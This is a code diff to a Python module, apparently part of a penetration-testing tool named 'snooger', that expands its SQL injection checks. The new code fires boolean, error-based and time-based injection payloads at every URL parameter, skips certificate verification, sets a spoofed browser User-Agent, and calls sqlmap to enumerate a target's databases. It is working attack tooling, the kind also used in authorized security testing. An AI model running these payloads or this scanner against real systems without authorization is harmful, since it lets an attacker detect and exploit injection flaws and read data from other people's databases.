@@ -1,82 +1,156 @@
 import os
-import json
+import re
+import logging
 import requests
-from core.utils import run_command, save_raw_output
+import time
+import difflib
+from typing import Tuple
+from core.utils import run_command, save_raw_output, parse_url_params
+from core.rate_limiter import get_rate_limiter
 
-def quick_sqli_test(url, workspace_dir):
-    """
-    Run a quick boolean-based test to confirm SQLi without heavy scanning.
-    """
-    print(f"[Validation] Quick SQLi test on {url}")
-    try:
-        session = requests.Session()
-        base_url = url.split('?')[0]
-        params = {}
-        if '?' in url:
-            qs = url.split('?')[1]
-            for pair in qs.split('&'):
-                if '=' in pair:
-                    k, v = pair.split('=', 1)
-                    params[k] = v
+logger = logging.getLogger('snooger')
 
-        original_resp = session.get(base_url, params=params, timeout=10)
-        original_length = len(original_resp.text)
+ERROR_PATTERNS = [
+    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
+    r"ORA-\d{4,5}", r"Oracle.*Driver", r"Oracle.*Error",
+    r"Microsoft.*ODBC.*SQL", r"Unclosed quotation mark",
+    r"SQLSTATE\[", r"PSQLException", r"PostgreSQL.*ERROR",
+    r"SQLite.*Exception", r"near \".*\": syntax error",
+    r"Incorrect syntax near", r"mssql_", r"ODBC.*Driver",
+    r"DB2.*SQL.*error", r"Dynamic SQL Error", r"Warning.*SQLite",
+]
 
-        payloads = [
-            ("' OR '1'='1", "' OR '1'='1"),
-            ("' OR '1'='1' --", "' OR '1'='1' --"),
-            ("1 AND 1=1", "1 AND 1=1"),
-            ("1 AND 1=2", "1 AND 1=2")
-        ]
+def quick_sqli_test(url: str, workspace_dir: str, auth=None) -> dict:
+    """Fast SQLi detection using differential analysis + error detection."""
+    logger.debug(f"Quick SQLi test: {url}")
+    rl = get_rate_limiter()
+    base_url, params = parse_url_params(url)
+    if not params:
+        return {'validated': False, 'reason': 'no parameters'}
 
-        for param in params:
-            original = params[param]
-            for payload_desc, payload in payloads:
-                test_params = params.copy()
-                test_params[param] = original + payload
-                try:
-                    resp = session.get(base_url, params=test_params, timeout=10)
-                    if len(resp.text) != original_length or "error" in resp.text.lower():
+    session = auth.session if auth else requests.Session()
+    session.headers.setdefault('User-Agent', 'Mozilla/5.0')
+
+    for param in params:
+        original = params[param]
+        try:
+            rl.wait(base_url)
+            baseline = session.get(base_url, params=params, timeout=10, verify=False)
+            baseline_text = baseline.text
+        except Exception as e:
+            logger.debug(f"Baseline request failed: {e}")
+            continue
+
+        # Boolean-based differential
+        true_params = params.copy()
+        true_params[param] = original + "' OR '1'='1' -- -"
+        false_params = params.copy()
+        false_params[param] = original + "' OR '1'='2' -- -"
+
+        try:
+            rl.wait(base_url)
+            true_resp = session.get(base_url, params=true_params, timeout=10, verify=False)
+            rl.wait(base_url)
+            false_resp = session.get(base_url, params=false_params, timeout=10, verify=False)
+
+            # Error-based detection
+            for pattern in ERROR_PATTERNS:
+                for resp in [true_resp, false_resp]:
+                    if re.search(pattern, resp.text, re.IGNORECASE):
                         return {
                             'validated': True,
-                            'type': 'SQL Injection',
+                            'type': 'SQL Injection (error-based)',
                             'parameter': param,
-                            'payload': payload,
-                            'evidence': f"Response length changed from {original_length} to {len(resp.text)}"
+                            'payload': true_params[param],
+                            'evidence': f"SQL error pattern: {pattern}",
+                            'severity': 'critical'
                         }
-                except Exception:
-                    pass
-    except Exception as e:
-        print(f"[Validation] Quick SQLi test error: {e}")
+
+            # Differential analysis using similarity
+            similarity = difflib.SequenceMatcher(
+                None, true_resp.text, false_resp.text
+            ).ratio()
+
+            if similarity < 0.8:
+                baseline_sim = difflib.SequenceMatcher(
+                    None, baseline_text, true_resp.text
+                ).ratio()
+                if baseline_sim > 0.9:  # True condition = baseline, false = different
+                    return {
+                        'validated': True,
+                        'type': 'SQL Injection (boolean-based)',
+                        'parameter': param,
+                        'payload': true_params[param],
+                        'evidence': f"Boolean differential: true/false similarity={similarity:.2f}",
+                        'severity': 'high'
+                    }
+
+            # Time-based
+            sleep_params = params.copy()
+            sleep_params[param] = original + "' AND SLEEP(4) -- -"
+            rl.wait(base_url)
+            start = time.time()
+            session.get(base_url, params=sleep_params, timeout=8, verify=False)
+            elapsed = time.time() - start
+            if elapsed > 3.5:
+                return {
+                    'validated': True,
+                    'type': 'SQL Injection (time-based)',
+                    'parameter': param,
+                    'payload': sleep_params[param],
+                    'evidence': f"Response delayed {elapsed:.1f}s after SLEEP(4)",
+                    'severity': 'high'
+                }
+
+        except requests.exceptions.Timeout:
+            return {
+                'validated': True,
+                'type': 'SQL Injection (time-based, timeout)',
+                'parameter': param,
+                'evidence': 'Request timed out after time-based payload',
+                'severity': 'high'
+            }
+        except Exception as e:
+            logger.debug(f"SQLi test error for param {param}: {e}")
+
     return {'validated': False}
 
-def validate_sqlmap(url, workspace_dir, extra_params="--batch --dbs --level=1 --risk=1"):
-    """
-    Validate SQL injection using sqlmap.
-    """
-    print(f"[Validation] Running sqlmap on {url}")
+def validate_sqlmap(url: str, workspace_dir: str,
+                    extra_params: str = "--batch --dbs --level=1 --risk=1",
+                    auth=None) -> dict:
+    """Run sqlmap for definitive SQLi confirmation."""
+    logger.info(f"Running sqlmap validation on {url}")
     out_dir = os.path.join(workspace_dir, 'validation', 'sqlmap')
     os.makedirs(out_dir, exist_ok=True)
-    cmd = f"sqlmap -u {url} {extra_params} --output-dir={out_dir}"
+    cmd = f"sqlmap -u '{url}' {extra_params} --output-dir={out_dir} --no-logging"
     stdout, stderr, rc = run_command(cmd, timeout=300)
-    save_raw_output(workspace_dir, 'validation', f'sqlmap_{abs(hash(url))}', stdout + stderr, 'txt')
+    save_raw_output(workspace_dir, 'validation', f'sqlmap_{abs(hash(url)) % 100000}', stdout + stderr, 'txt')
 
-    if "available databases" in stdout or "vulnerable" in stdout.lower():
-        lines = stdout.splitlines()
-        dbs = []
-        capture = False
-        for line in lines:
-            if "available databases" in line:
-                capture = True
-                continue
-            if capture and line.strip() and not line.startswith('['):
-                dbs.append(line.split()[0] if line.split() else '')
+    is_vulnerable = ("vulnerable" in stdout.lower() or
+                     "available databases" in stdout or
+                     "sqlmap identified" in stdout.lower())
+    if is_vulnerable:
+        dbs = _extract_databases(stdout)
         return {
             'validated': True,
             'type': 'SQL Injection',
             'tool': 'sqlmap',
-            'evidence': stdout[:500] + "...",
-            'databases': dbs[:5]
+            'evidence': stdout[:800],
+            'databases': dbs
         }
-    else:
-        return {'validated': False, 'tool': 'sqlmap'}
+    return {'validated': False, 'tool': 'sqlmap'}
+
+def _extract_databases(sqlmap_output: str) -> list:
+    dbs = []
+    capture = False
+    for line in sqlmap_output.splitlines():
+        if "available databases" in line.lower():
+            capture = True
+            continue
+        if capture:
+            stripped = line.strip()
+            if stripped and not stripped.startswith('[') and len(stripped) < 50:
+                dbs.append(stripped.lstrip('* '))
+            elif stripped.startswith('[') or not stripped:
+                capture = False
+    return dbs[:10]
